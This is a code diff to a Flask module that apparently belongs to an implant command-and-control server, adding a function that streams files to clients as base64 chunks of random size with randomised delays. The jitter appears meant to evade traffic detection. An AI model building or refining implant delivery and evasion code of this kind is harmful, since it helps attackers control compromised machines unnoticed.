@@ -1,10 +1,14 @@
+from flask import Response
+import time
+import logging
+import random
+import base64
+import magic
+
 from app.database import db
 from app.database.models import CommandQueue
 from app.database.models import FileChunk
 
-import base64
-import logging
-import magic
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -117,3 +121,30 @@ def get_file_ids():
         file_ids_by_implant[implant_uuid].append(file_id)
 
     return file_ids_by_implant
+
+
+def stream_file(file_path):
+    # set the seed to time so that it changes with every run
+    random.seed()
+
+    def generate():
+        with open(file_path, "rb") as file:
+            while True:
+                chunk_size = random.randint(
+                    256 * 1024, 1024 * 1024
+                )  # Random chunk size between 256 KB and 1 MB
+                chunk = file.read(chunk_size)
+                if not chunk:
+                    break
+
+                encoded_chunk = base64.b64encode(chunk).decode("utf-8")
+                logging.debug(
+                    f"Encoded chunk (length: {len(encoded_chunk)}): {encoded_chunk[:100]}..."
+                )
+
+                yield encoded_chunk + "\n"
+                time.sleep(
+                    random.uniform(0.505, 1.25)
+                )  # Sleep between 505ms and 1250ms
+
+    return Response(generate(), mimetype="text/plain")
